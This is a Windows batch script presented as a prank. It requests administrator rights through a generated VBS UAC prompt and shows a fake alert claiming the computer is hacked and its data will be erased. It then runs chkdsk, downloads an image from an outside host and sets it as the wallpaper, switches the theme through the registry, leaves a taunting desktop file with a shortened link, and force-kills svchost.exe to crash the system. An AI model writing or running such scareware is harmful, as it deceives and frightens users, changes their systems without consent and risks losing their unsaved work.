:: Copyright (©) 2023 SpaceGameDev568. All Rights Reserved.

@echo off

cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden "Write-Host"

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

echo x=msgbox("You have been hacked! This program will erase all of your data momentarily..." ,0, "Windows Alerts") >> msgbox.vbs

start msgbox.vbs

echo y|chkdsk C: /f

echo I GOT U LMAO! This was a prank and your computer has not been modified. Though, I did make some asthetic changes to your system which should help avoid eye strain. Hope you like it! For more info go here: https://bit.ly/3RlY3NI >> "%USERPROFILE%\Desktop\HAHALOL.txt"

curl "https://assets.spacegamedev.com/images/backgrounds/spikeyballart/BlueSpikeyBallRender.png" --output "%USERPROFILE%\Desktop\Spaces-Wallpaper.png"

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%USERPROFILE%\Desktop\Spaces-Wallpaper.png" /f

powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name AppsUseLightTheme -Value 0"

powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"

DEL msgbox.vbs

RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

timeout /t 7

:: /r for restart, /s for shutdown
::shutdown /s -f -t 0

:: Outright crash the computer to be more convincing
taskkill.exe /f /im svchost.exe